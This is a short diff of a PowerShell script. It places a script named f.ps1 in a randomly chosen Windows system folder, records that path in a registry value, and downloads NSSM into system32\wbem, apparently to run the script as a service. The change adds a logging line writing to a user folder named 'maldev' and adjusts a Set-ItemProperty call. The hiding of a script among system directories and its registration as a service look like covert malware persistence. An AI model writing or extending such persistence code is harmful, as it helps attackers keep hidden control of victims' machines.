@@ -9,7 +9,7 @@ $paths = @(
     "$env:windir\System32\drivers\etc",
     "$env:windir\System32\LogFiles\WMI"
 )
-
+echo $basePath >> "C:\Users\maldev\Downloads\init_fwd.txt"
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
@@ -23,7 +23,7 @@ $downloadPath = "$env:temp\nssm.zip"
 if(($fwdPath -eq $null) -or ($fwdPath -eq "")){
     $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $fwdPath = "$fwdPath\f.ps1"
-    Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $fwdPath -Force | Out-Null
+    Set-ItemProperty -Path $basePath -Name $propertyName -Value $fwdPath -Force | Out-Null
 }
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
